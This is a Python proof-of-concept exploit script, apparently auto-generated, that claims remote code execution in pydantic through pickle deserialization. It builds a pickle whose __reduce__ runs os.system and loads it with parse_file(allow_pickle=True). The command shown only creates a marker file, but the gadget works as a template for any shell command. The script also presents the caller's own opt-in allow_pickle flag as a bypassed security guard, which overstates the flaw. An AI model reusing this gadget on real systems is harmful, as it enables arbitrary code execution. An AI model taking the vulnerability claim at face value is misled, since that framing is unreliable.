#!/usr/bin/env python3
# PoC for pydantic (/home/xcy/.local/lib/python3.14/site-packages/pydantic)
# Path: rce-011
# Sink: load_str_bytes
# Auto-generated — run with: python3 rce_load_str_bytes_if_load_str_bytes.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pydantic RCE via pickle deserialization.

Vulnerability: The `parse_file` method allows an attacker to set `allow_pickle=True`
and provide a path to a malicious pickle file. The file contents are passed to
`pickle.loads()`, leading to arbitrary code execution.

This PoC:
1. Creates a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Uses pydantic's parse_file with allow_pickle=True to trigger the deserialization
3. Verifies the command was executed

Usage: python3 pydantic_rce_poc.py
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Ensure pydantic is available
try:
    from pydantic import BaseModel
    from pydantic.v1.parse import load_file, load_str_bytes
except ImportError as e:
    print(f"[!] Failed to import pydantic: {e}")
    print("[!] Make sure pydantic is installed in the expected location")
    sys.exit(1)


class MaliciousPickle:
    """
    A class that executes a command when unpickled.
    Uses __reduce__ to define what happens during deserialization.
    """
    def __reduce__(self):
        # Benign payload: create a marker file
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))


def create_malicious_pickle(filepath: str) -> None:
    """
    Create a pickle file that will execute our payload when deserialized.
    
    Args:
        filepath: Path where the malicious pickle file will be written
    """
    print(f"[*] Creating malicious pickle file at: {filepath}")
    
    # Create the malicious object
    malicious_obj = MaliciousPickle()
    
    # Serialize it to the file
    with open(filepath, 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Malicious pickle file created successfully")


def verify_exploit() -> bool:
    """
    Check if the exploit was successful by looking for the marker file.
    
    Returns:
        True if the marker file exists, False otherwise
    """
    marker_path = Path("/tmp/poc_success.txt")
    if marker_path.exists():
        print(f"[+] Exploit successful! Marker file found at: {marker_path}")
        # Clean up the marker file
        marker_path.unlink()
        return True
    else:
        print("[-] Exploit may have failed - marker file not found")
        return False


def main():
    """
    Main exploit function.
    
    Steps:
    1. Create a malicious pickle file
    2. Use pydantic's parse_file to load it with allow_pickle=True
    3. Verify the command was executed
    """
    print("[*] Pydantic RCE Proof-of-Concept")
    print("[*] ==============================")
    
    # Create a temporary file for our malicious pickle
    with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False) as tmp:
        pickle_path = tmp.name
    
    try:
        # Step 1: Create the malicious pickle file
        create_malicious_pickle(pickle_path)
        
        # Step 2: Trigger the vulnerability using pydantic's parse_file
        print(f"[*] Triggering deserialization via parse_file with allow_pickle=True")
        print(f"[*] Loading file: {pickle_path}")
        
        # We need a model class for parse_file to work
        class DummyModel(BaseModel):
            pass
        
        try:
            # This is the vulnerable call - attacker controls path and allow_pickle
            result = DummyModel.parse_file(
                pickle_path,
                allow_pickle=True  # This bypasses the security guard
            )
            print(f"[*] parse_file returned: {result}")
        except Exception as e:
            # The exploit may still work even if parse_file raises an exception
            # because the pickle deserialization happens before the model validation
            print(f"[*] parse_file raised exception (expected): {e}")
        
        # Step 3: Verify the exploit
        success = verify_exploit()
        
        if success:
            print("[+] RCE achieved via pickle deserialization!")
            print("[+] The vulnerability is confirmed exploitable.")
        else:
            print("[-] Exploit verification failed.")
            print("[*] Check if the marker file was created manually:")
            print("    ls -la /tmp/poc_success.txt")
    
    finally:
        # Clean up the temporary pickle file
        if os.path.exists(pickle_path):
            os.unlink(pickle_path)
            print(f"[*] Cleaned up temporary file: {pickle_path}")


if __name__ == "__main__":
    main()
